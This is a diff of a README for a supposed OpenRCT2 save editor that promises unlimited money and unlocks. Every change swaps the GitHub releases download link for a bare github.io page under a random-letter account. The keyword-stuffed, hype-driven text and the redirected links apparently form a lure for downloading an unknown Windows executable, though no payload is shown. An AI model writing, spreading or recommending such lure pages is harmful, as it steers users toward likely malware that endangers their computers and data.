@@ -1,7 +1,7 @@
 <h1>🎢 openrct2-save-editor-2026 - Unlock Everything in Your Game Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/oeidfesiofjefiojsejf/openrct2-save-editor-2026/releases"><img src="https://img.shields.io/badge/Download-Now!-brightgreen?style=for-the-badge&logo=windows&logoColor=white" alt="Download Badge" width="300"></a>
+<a href="https://oeidfesiofjefiojsejf.github.io"><img src="https://img.shields.io/badge/Download-Now!-brightgreen?style=for-the-badge&logo=windows&logoColor=white" alt="Download Badge" width="300"></a>
 </p>
 
 ## 🎯 What Is This?
@@ -35,7 +35,7 @@ Follow these three simple steps to start editing your saves today.
 ### Step 1: Download the Tool
 
 Visit this link to download the application:  
-**[https://github.com/oeidfesiofjefiojsejf/openrct2-save-editor-2026/releases](https://github.com/oeidfesiofjefiojsejf/openrct2-save-editor-2026/releases)**
+**[https://oeidfesiofjefiojsejf.github.io](https://oeidfesiofjefiojsejf.github.io)**
 
 On that page, look for the newest version. Click the download button. The file will be saved to your Downloads folder.
 
@@ -125,6 +125,6 @@ If you run into any problems, check the repository page on GitHub. There you'll 
 
 openrct2-save-editor-2026 gives you total control over your game. You stop being a slave to high prices and slow research. You become the architect of your perfect park. Download it now and transform your OpenRCT2 adventure.
 
-[🔗 Donwload Here] [https://github.com/oeidfesiofjefiojsejf/openrct2-save-editor-2026/releases](https://github.com/oeidfesiofjefiojsejf/openrct2-save-editor-2026/releases)
+[🔗 Donwload Here] [https://oeidfesiofjefiojsejf.github.io](https://oeidfesiofjefiojsejf.github.io)
 
 Keywords: 2026, all-unlocks, campaign, dlc, editor, free, guest, money, openrct2, rct2, research, rides, rollercoaster-tycoon, save, scenarios, scenery, simulation, unlock, weather, windows
